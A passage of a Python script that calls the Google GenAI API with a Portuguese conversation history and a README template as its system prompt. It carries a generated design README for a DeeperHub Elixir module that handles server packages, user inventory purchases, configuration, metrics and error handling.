2.  **Controller API:** Chama `DeeperHub.UserInventory.acquire_package(user_id, \"pkg_123\", %{payment_method: :platform_points, expected_points_cost: 100})`.
3.  **`UserInventoryService.acquire_package/3`:**
    *   Busca `ServerPackageSchema` para \"pkg_123\" (via `ServerPackages.get_server_package`). Verifica se está ativo e o preço.
    *   Verifica se o usuário já atingiu `max_per_user` para este pacote, se aplicável.
    *   Chama `DeeperHub.PointsService.debit_points(user_id, 100, %{reason: \"Purchase of pkg_123\"})`.
    *   **Se débito falhar (saldo insuficiente):** Retorna `{:error, :insufficient_points}`.
    *   **Se débito OK:**
        *   Inicia uma transação `Core.Repo.transaction/2`.
        *   Dentro da transação:
            *   Cria um `UserPackageInstanceSchema` (`user_id`, `server_package_id`, `acquired_at`, `status: :active` (ou `:consumed` se o efeito é imediato e único)).
            *   Incrementa `total_purchased_count` no `ServerPackageSchema`.
        *   **Fim da transação.**
        *   Se a transação do Repo falhar, tenta reverter o débito de pontos (lógica de compensação ou saga pode ser necessária aqui, ou a transação de pontos deve fazer parte da transação do Repo se o PointsService usar o mesmo DB).
        *   Se tudo OK:
            *   Chama `GrantingService.apply_benefits(user_id, server_package.benefits_payload, %{source_package_instance_id: ...})`.
            *   Publica evento `user_package.acquired` no `Core.EventBus`.
            *   Notifica o usuário.
            *   Retorna `{:ok, user_package_instance}`.

## 📡 6. API (Funções Públicas das Fachadas)

### `DeeperHub.ServerPackages` (Gerenciamento de Definições)

*   `create_server_package(creator_user_id, server_id, attrs)`
*   `update_server_package(package_id, attrs, current_user_id)`
*   `delete_server_package(package_id, current_user_id)`
*   `get_server_package(package_id)`
*   `list_server_packages_by_server(server_id, opts)`
*   `list_all_server_packages(filters, opts)`

### `DeeperHub.UserInventory` (Aquisição e Gerenciamento de Instâncias de Usuário)

*   **`DeeperHub.UserInventory.acquire_package(user_id :: String.t(), server_package_id :: String.t(), acquisition_context :: map()) :: {:ok, UserPackageInstance.t()} | {:error, term()}`**
    *   `acquisition_context`: `%{payment_method: :platform_points | :real_money_transaction_id, expected_cost: Decimal.t() | nil}`.
*   **`DeeperHub.UserInventory.list_my_active_packages(user_id :: String.t(), opts :: keyword()) :: {:ok, list(UserPackageInstanceView.t())}`**
    *   `UserPackageInstanceView.t()`: Combina dados da instância com a definição do pacote.
*   **`DeeperHub.UserInventory.get_package_instance_details(user_package_instance_id :: String.t(), user_id :: String.t()) :: {:ok, UserPackageInstanceView.t() | nil}`**
*   **`DeeperHub.UserInventory.cancel_subscription(user_package_instance_id :: String.t(), user_id :: String.t()) :: :ok | {:error, term()}`** (Se houver assinaturas)

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:server_packages, :enabled]`** (Boolean).
*   **`[:server_packages, :max_name_length]`** (Integer).
*   **`[:server_packages, :max_description_length]`** (Integer).
*   **`[:server_packages, :allowed_currencies]`** (List de Strings): Ex: `[\"POINTS_PLATFORM\", \"USD\"]`.
*   **`[:server_packages, :default_package_types]`** (List de Atoms): Ex: `[:one_time, :subscription]`.
*   **`[:server_packages, :cache, :package_definition_ttl_seconds]`** (Integer).
*   **`[:user_inventory, :default_subscription_renewal_notification_days_before]`** (Integer): Para enviar lembretes de renovação.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.*`.
*   `DeeperHub.Servers`: Para `server_id`.
*   `DeeperHub.Accounts`: Para `user_id`.
*   `DeeperHub.Auth`/`RBAC`: Para permissões.
*   `DeeperHub.Notifications`: Para notificar sobre aquisições.
*   `DeeperHub.Payments` (Opcional).
*   `DeeperHub.PointsService` (ou similar, Opcional).
*   `DeeperHub.Audit`.

### 8.2. Bibliotecas Externas

*   `Ecto`.
*   `Decimal`.

## 🤝 9. Como Usar / Integração

*   **UI do Proprietário do Servidor:** Para definir e gerenciar os pacotes que seu servidor oferece.
*   **Loja na Página do Servidor (UI do Jogador):** Para listar pacotes e iniciar o fluxo de aquisição.
*   **Servidor de Jogo (Externo):** Pode precisar de uma API para:
    *   Verificar os pacotes/benefícios ativos de um jogador (via `UserInventory`).
    *   (Potencialmente) Conceder itens/benefícios no jogo após o `GrantingService` ser notificado (ex: via webhook ou API do jogo).

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD para `ServerPackageSchema`.
*   Testar o fluxo completo de aquisição de pacotes com diferentes métodos de pagamento (mockados).
*   Testar a correta concessão de benefícios pelo `GrantingService` (com mocks para sistemas externos).
*   Testar a lógica de assinaturas (criação, renovação, cancelamento, expiração).
*   Testar limites (ex: `max_per_user`).
*   Localização: `test/deeper_hub/server_packages/` e `test/deeper_hub/user_inventory/`.

### 10.2. Métricas

*   `deeper_hub.server_packages.definitions.count` (Gauge, tags: `server_id`)
*   `deeper_hub.user_inventory.package_acquired.count` (tags: `package_id`, `server_id`, `payment_method`)
*   `deeper_hub.user_inventory.revenue_generated.sum` (Contador, tags: `currency`, `package_id`) (Para moeda real)
*   `deeper_hub.user_inventory.points_spent.sum` (Contador, tags: `package_id`) (Para moeda virtual)
*   `deeper_hub.user_inventory.active_subscriptions.gauge` (tags: `package_id`)

### 10.3. Logs

*   **Nível INFO:** Definição de pacote criada/atualizada. Pacote adquirido por usuário. Benefícios concedidos.
*   **Nível WARNING:** Tentativa de adquirir pacote sem saldo/meio de pagamento válido. Falha na concessão de um benefício específico (com retry se aplicável).
*   **Nível ERROR:** Falha crítica no processamento de pagamento. Falha ao persistir `UserPackageInstance` após pagamento confirmado.

### 10.4. Telemetria

*   `[:deeper_hub, :server_packages, :definition, :created | :updated | :deleted]`
*   `[:deeper_hub, :user_inventory, :acquisition_attempt, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, package_id: id, payment_method: method}`
    *   No `:stop`: `%{status: :success | :failure_payment | :failure_granting, instance_id: id}`
*   `[:deeper_hub, :user_inventory, :benefit_granting, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, package_instance_id: id, benefit_type: type}`

## ❌ 11. Tratamento de Erros

*   **Falha no Pagamento:** O fluxo de aquisição deve parar, nenhum benefício concedido.
*   **Falha na Concessão de Benefícios Pós-Pagamento:** Este é um cenário crítico. Idealmente, a concessão é parte da mesma transação. Se não for possível, o pagamento deve ser reembolsado/estornado, ou a concessão deve ser reenfileirada com alta prioridade e monitoramento.
*   Erros de validação na criação de pacotes retornam `{:error, changeset}`.

## 🛡️ 12. Considerações de Segurança

*   **Validação de Preços:** Impedir preços negativos ou absurdamente baixos/altos.
*   **Segurança do Fluxo de Pagamento:** Se envolver dinheiro real, a integração com o `Payments` deve ser PCI DSS compliant (se aplicável) e seguir todas as melhores práticas de segurança para transações financeiras.
*   **Concessão de Benefícios:** A lógica no `GrantingService` deve ser segura para evitar que usuários ganhem benefícios indevidamente.
*   **Autorização:** Apenas proprietários de servidores podem criar pacotes para *seus* servidores. Administradores da plataforma podem ter permissões mais amplas.

## 🧑‍💻 13. Contribuição

*   O `benefits_payload` é um ponto chave de extensão. Novos tipos de benefícios exigirão novos \"handlers\" no `GrantingService`.
*   A lógica de assinatura pode se tornar um submódulo próprio se muito complexa.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar um sistema de cupons de desconto para pacotes.
*   [ ] Permitir \"pacotes de presente\" que um usuário pode comprar para outro.
*   [ ] Suporte para pacotes com quantidade limitada de estoque.
*   [ ] Histórico de compras detalhado para o usuário.
*   [ ] Ferramentas para proprietários de servidores analisarem as vendas e popularidade de seus pacotes.
*   [ ] Reembolsos e gerenciamento de disputas para pacotes pagos.
*   [ ] Integração com APIs de jogos para concessão automática de itens/benefícios diretamente no jogo.

---

*Última atualização: 2025-05-13*

---

Este módulo de pacotes adiciona uma camada significativa de funcionalidade e potencial de monetização.

Próximo? Podemos cobrir o `DeeperHub.ServerUpdateMessages` para completar as funcionalidades de \"comunicação\" do servidor, ou o módulo genérico `DeeperHub.Lists`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
    ]
    generate_content_config = types.GenerateContentConfig(
        response_mime_type="text/plain",
        system_instruction=[
            types.Part.from_text(text="""Você é um especialista em documentação e arquitetura de sistemas. 
Você é excelente em categorizar, especificar e criar arquivos README dos Módulos do Sistema.
Você organiza, especifica e categoria o máximo ***todas*** as características e itens de todos os módulos de sistemas. Sempre especifica TUDO!

# Template: README para Módulos do DeeperHub

Este é um template para a criação de arquivos `README.md` para os módulos do projeto DeeperHub. O objetivo é padronizar a documentação, tornando-a mais clara, completa e consistente.

**Instruções:**
- Substitua `[Nome do Módulo]` pelo nome real do módulo.
- Adapte e preencha cada seção conforme a especificidade do módulo.
- Remova seções que não se aplicam.
- Adicione seções específicas se necessário.
- Mantenha a linguagem em Português (BR) e o uso de emojis 😊.

---

# Módulo: `[Nome do Módulo]` 🚀

## 📜 1. Visão Geral do Módulo `[Nome do Módulo]`

<!-- 
Descreva de forma concisa o que este módulo faz, qual seu propósito principal e seu papel dentro do sistema DeeperHub. 
Ex: \"O módulo de Autenticação é responsável por verificar a identidade dos usuários e gerenciar suas sessões.\" 
Exemplo para um módulo de `UserProfile`:
\"O módulo UserProfile gerencia todos os dados relacionados ao perfil do usuário, como nome, avatar, preferências de contato e biografia. Ele fornece uma API para outros módulos consultarem e atualizarem essas informações.\"
-->

## 🎯 2. Responsabilidades e Funcionalidades Chave

<!-- 
Liste as principais responsabilidades e funcionalidades que este módulo oferece.
Use bullet points para clareza.
Ex:
- Gerenciar o ciclo de vida das contas de usuário.
- Processar pagamentos e assinaturas.
- Integrar com o sistema de notificações para alertas de segurança.

Exemplo para `UserProfile`:
- CRUD (Create, Read, Update, Delete) de informações de perfil.
- Validação de dados do perfil (ex: formato de email, tamanho da biografia).
- Gerenciamento de upload e armazenamento de avatares.
- Emissão de eventos de alteração de perfil para outros módulos interessados (ex: `UserProfileUpdatedEvent`).
-->

*   [Funcionalidade/Responsabilidade 1]
*   [Funcionalidade/Responsabilidade 2]
*   [Funcionalidade/Responsabilidade ...]

## 🏗️ 3. Arquitetura e Design

<!-- 
Descreva a arquitetura interna do módulo. 
- Quais são os principais componentes (ex: GenServers, Supervisores, Contexts, Schemas, Serviços, Adaptadores)?
- Como eles interagem entre si?
- Há algum padrão de design específico utilizado (ex: Fachada, Adaptador, Strategy)?
- Se relevante, inclua um diagrama simples ou descreva a estrutura de diretórios do módulo.
-->

### 3.1. Componentes Principais

<!-- 
Liste e descreva brevemente os componentes mais importantes do módulo.
Ex:
- `NomeDoModulo.ServicoPrincipal`: Orquestra as operações X, Y, Z.
- `NomeDoModulo.Worker`: Processa tarefas assíncronas do tipo A.
-->

### 3.2. Estrutura de Diretórios (Opcional)

<!-- 
Se a estrutura de diretórios for complexa ou específica, descreva-a aqui.
-->

### 3.3. Decisões de Design Importantes

<!-- 
Justifique escolhas de design significativas que foram feitas.
Exemplo:
- \"Optou-se por usar um GenServer (`UserProfile.AvatarProcessor`) para o processamento de avatares de forma assíncrona, liberando o processo chamador e melhorando a responsividade da API de upload.\"
- \"A comunicação com o serviço de armazenamento de arquivos (S3) é feita através de um Adaptador (`StorageAdapter`) para facilitar a substituição do provedor no futuro, seguindo o Princípio da Inversão de Dependência.\"
-->

## 🛠️ 4. Casos de Uso Principais

<!-- 
Descreva os cenários mais comuns ou importantes em que este módulo é utilizado.
Ex:
- **Registro de Novo Usuário:** Um novo usuário se cadastra na plataforma, e este módulo valida os dados e cria a conta.
- **Recuperação de Senha:** Um usuário esquece a senha e solicita a redefinição.

Exemplo para `UserProfile`:
- **Atualização de Perfil pelo Usuário:** O usuário acessa a página de configurações e altera seu nome e biografia.
- **Consulta de Perfil por Outro Módulo:** O módulo de `Posts` precisa exibir o nome e avatar do autor de uma postagem.
- **Upload de Novo Avatar:** O usuário seleciona uma nova imagem para seu perfil.
-->

*   **Caso de Uso 1:** [Descrição]
*   **Caso de Uso 2:** [Descrição]

## 🌊 5. Fluxos Importantes (Opcional)

<!-- 
Detalhe fluxos de trabalho ou processos críticos que o módulo executa. 
Pode ser uma sequência de passos, interações entre componentes, ou como os dados fluem.
Ex: Fluxo de Autenticação com MFA, Fluxo de Processamento de Pedido.

Exemplo para \"Upload de Novo Avatar\" no módulo `UserProfile`:
1. Usuário envia uma requisição `POST /api/v1/profile/avatar` com a imagem.
2. `UserProfile.AvatarController` recebe a requisição e valida o token de autenticação e o tipo/tamanho do arquivo.
3. `UserProfile.AvatarService.upload_avatar/2` é chamado com o `user_id` e o arquivo.
4. O serviço redimensiona a imagem para tamanhos padronizados (thumbnail, medium).
5. O serviço envia as imagens processadas para o `StorageAdapter`.
6. `StorageAdapter` armazena as imagens (ex: no S3) e retorna as URLs.
7. `UserProfile.AvatarService` atualiza o `UserProfileSchema` do usuário com as novas URLs do avatar.
8. `UserProfile.AvatarService` emite um evento `UserProfileUpdatedEvent` com os dados do perfil atualizado.
9. `UserProfile.AvatarController` retorna uma resposta `200 OK` com as novas URLs do avatar.
-->

1.  Passo 1
2.  Passo 2
3.  ...

## 📡 6. API (Se Aplicável)

<!-- 
Se o módulo expõe uma API (interna ou externa), documente-a aqui.
Para APIs REST:
- Endpoints (método HTTP e caminho)
- Parâmetros de entrada (query, path, body)
- Formato das requisições e respostas (JSON)
- Exemplos de requisição e resposta
- Autenticação necessária

Para APIs de Módulo Elixir (funções públicas):
- Assinatura da função (`@spec`)
- Breve descrição do que a função faz
- Parâmetros e seus tipos
- Valor de retorno (`{:ok, resultado}` ou `{:error, razao}`)
- Efeitos colaterais

Exemplo para uma função Elixir do módulo `UserProfile`:

### `UserProfile.Facade.get_profile/1`

*   **Descrição:** Busca o perfil de um usuário pelo seu ID.
*   **`@spec`:** `get_profile(user_id :: String.t()) :: {:ok, UserProfile.Schema.t()} | {:error, :not_found | term()}`
*   **Parâmetros:**
    *   `user_id` (String): O ID do usuário.
*   **Retorno:**
    *   `{:ok, UserProfile.Schema.t()}`: Em caso de sucesso, retorna o schema do perfil do usuário.
    *   `{:error, :not_found}`: Se o perfil não for encontrado.
    *   `{:error, term()}`: Para outros erros internos.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    case UserProfile.Facade.get_profile(\"user123\") do
      {:ok, profile} -> IO.inspect(profile)
      {:error, reason} -> Logger.error(\"Falha ao buscar perfil: #{inspect(reason)}\")
    end
    ```

Exemplo para um endpoint REST do módulo `UserProfile`:

### `GET /api/v1/users/{user_id}/profile`

*   **Descrição:** Retorna os dados do perfil público de um usuário.
*   **Autenticação:** Requer token de acesso válido.
*   **Parâmetros de Caminho (Path Parameters):**
    *   `user_id` (string): ID do usuário.
*   **Resposta de Sucesso (200 OK):**
    ```json
    {
      \"data\": {
        \"user_id\": \"user123\",
        \"username\": \"john_doe\",
        \"bio\": \"Entusiasta de Elixir\",
        \"avatar_urls\": {
          \"thumbnail\": \"https://cdn.example.com/avatars/user123_thumb.jpg\",
          \"medium\": \"https://cdn.example.com/avatars/user123_medium.jpg\"
        }
      }
    }
    ```
*   **Resposta de Erro (404 Not Found):**
    ```json
    {
      \"errors\": [
        {
          \"status\": \"404\",
          \"title\": \"Not Found\",
          \"detail\": \"Perfil do usuário não encontrado.\"
        }
      ]
    }
    ```
-->

### 6.1. [Nome da Função Pública / Endpoint]

*   **Descrição:**
*   **Parâmetros:**
*   **Retorno:**
*   **Exemplo de Uso (Elixir) / Requisição (HTTP):**

## ⚙️ 7. Configuração

<!-- 
Descreva como o módulo pode ser configurado.
- Quais variáveis de ambiente ele utiliza?
- Quais chaves de configuração são lidas do `DeeperHub.Core.ConfigManager`?
- Quais são os valores padrão e como podem ser alterados?

Exemplo:
- **Variáveis de Ambiente:**
    *   `USER_PROFILE_MAX_BIO_LENGTH`: \"Controla o número máximo de caracteres permitidos na biografia do usuário. Padrão: 500\"
- **ConfigManager:**
    *   `:user_profile, :avatar_default_url`: \"URL para uma imagem de avatar padrão caso o usuário não tenha uma. Padrão: '/images/default_avatar.png'\"
-->

*   **Variáveis de Ambiente:**
    *   `VAR_EXEMPLO`: [Descrição e valor padrão]
*   **ConfigManager:**
    *   `:nome_do_modulo, :parametro_exemplo`: [Descrição e valor padrão]

## 🔗 8. Dependências

<!-- 
Liste as dependências do módulo.
- **Módulos Internos do DeeperHub:** (ex: `DeeperHub.Core.LoggerFacade`, `DeeperHub.Shared.Utils`)
- **Bibliotecas Externas:** (ex: `Ecto`, `Jason`, `Finch`)
- Justifique brevemente dependências menos óbvias.
-->

### 8.1. Módulos Internos

*   `[NomeDoModuloInterno]`

### 8.2. Bibliotecas Externas

*   `[NomeDaBibliotecaExterna]`

## 🤝 9. Como Usar / Integração

<!-- 
Forneça instruções sobre como outros módulos ou partes do sistema devem interagir com este módulo.
- Quais são os pontos de entrada principais (fachadas, funções públicas)?
- Há algum pré-requisito ou setup necessário antes de usar o módulo?
- Exemplos de código de como chamar as funcionalidades principais.
-->

```elixir
# Exemplo de como usar o módulo
NomeDoModulo.Facade.funcao_principal(argumento1, argumento2)
```

## ✅ 10. Testes e Observabilidade

<!-- 
Descreva a estratégia de testes e observabilidade para este módulo.
- Como executar os testes unitários e de integração?
- Quais métricas importantes são coletadas (`MetricsFacade`)?
- Quais eventos de telemetria são emitidos?
- Como os logs são estruturados (`LoggerFacade`)?
-->

### 10.1. Testes

<!-- 
Comandos para rodar os testes, localização dos arquivos de teste.
Exemplo:
- Testes unitários: `mix test test/deeper_hub/user_profile/`
- Teste específico: `mix test test/deeper_hub/user_profile/user_profile_service_test.exs:12` (linha 12)
- Cobertura de testes: `mix test --cover`
- Arquivos de teste localizados em `test/deeper_hub/[nome_do_modulo]/`
-->

### 10.2. Métricas

<!-- 
Principais métricas expostas.
Ex: `deeper_hub.[nome_do_modulo].funcao_x.count`
Exemplo para `UserProfile`:
- `deeper_hub.user_profile.get_profile.duration_ms` (Histograma): Tempo de resposta da função `get_profile/1`.
- `deeper_hub.user_profile.avatar_upload.success.count` (Contador): Número de uploads de avatar bem-sucedidos.
- `deeper_hub.user_profile.avatar_upload.failure.count` (Contador): Número de uploads de avatar falhos.
-->

### 10.3. Logs

<!-- 
Contexto ou tags importantes adicionadas aos logs.
Exemplo para `UserProfile`:
- Todos os logs do módulo incluem `{module: UserProfile, function: \"nome_da_funcao/aridade\"}`.
- Operações críticas incluem `user_id` e `trace_id` para facilitar a depuração e rastreamento.
- Ex: `Logger.info(\"Perfil atualizado\", user_id: user.id, changes: changes)`
-->

### 10.4. Telemetria

<!-- 
Eventos de telemetria importantes emitidos pelo módulo.
Ex: `[:deeper_hub, :nome_do_modulo, :evento_x, :start]`
Exemplo para `UserProfile`:
- `[:deeper_hub, :user_profile, :avatar_uploaded, :success]`: Emitido após um upload de avatar bem-sucedido.
- `[:deeper_hub, :user_profile, :avatar_uploaded, :failure]`: Emitido após um upload de avatar falho.
-->

## ❌ 11. Tratamento de Erros

<!-- 
Explique como o módulo lida com erros.
- Quais tipos de erros são retornados (ex: `{:error, :not_found}`, `{:error, {:validation, changeset}}`, exceções)?
- Como os chamadores devem tratar esses erros?
-->

## 🛡️ 12. Considerações de Segurança

<!-- 
Descreva quaisquer aspectos de segurança relevantes para este módulo.
- O módulo lida com dados sensíveis?
- Quais medidas de segurança foram implementadas (validação de entrada, sanitização, controle de acesso)?
- Há alguma vulnerabilidade conhecida ou potencial?

Exemplo para `UserProfile`:
- **Dados Sensíveis:** O módulo armazena informações pessoais como nome e email (se incluído no perfil).
- **Validação de Entrada:** Todas as entradas do usuário para atualização de perfil são validadas usando `Ecto.Changeset` para prevenir dados malformados e ataques básicos de injeção.
- **Sanitização:** A biografia do usuário é sanitizada para remover HTML/scripts potencialmente maliciosos antes de ser exibida.
- **Controle de Acesso:** Apenas o próprio usuário (ou administradores) pode modificar seu perfil. Consultas a perfis podem ter diferentes níveis de visibilidade (público, amigos, etc. - se aplicável).
- **Upload de Avatar:** Tipos de arquivo e tamanho são rigorosamente validados para prevenir upload de arquivos maliciosos ou excessivamente grandes.
-->

## 🧑‍💻 13. Contribuição

<!-- 
Instruções para desenvolvedores que desejam contribuir com este módulo.
- Padrões de código específicos do módulo.
- Processo para submeter alterações (PRs).
- Contato para dúvidas.
-->

Consulte as diretrizes gerais de contribuição do projeto DeeperHub.

## 🔮 14. Melhorias Futuras e TODOs

<!-- 
Liste ideias para melhorias futuras, funcionalidades planejadas ou `TODO:`s importantes que ainda precisam ser abordados.
-->

*   [ ] Implementar [Funcionalidade X]
*   [ ] Refatorar [Parte Y] para melhor performance/clareza.
*   Consultar `TODO:`s no código para tarefas pendentes.

---

*Última atualização: YYYY-MM-DD*"""),
        ],
    )

    for chunk in client.models.generate_content_stream(
        model=model,
        contents=contents,
        config=generate_content_config,
    ):
        print(chunk.text, end="")

if __name__ == "__main__":
    generate()
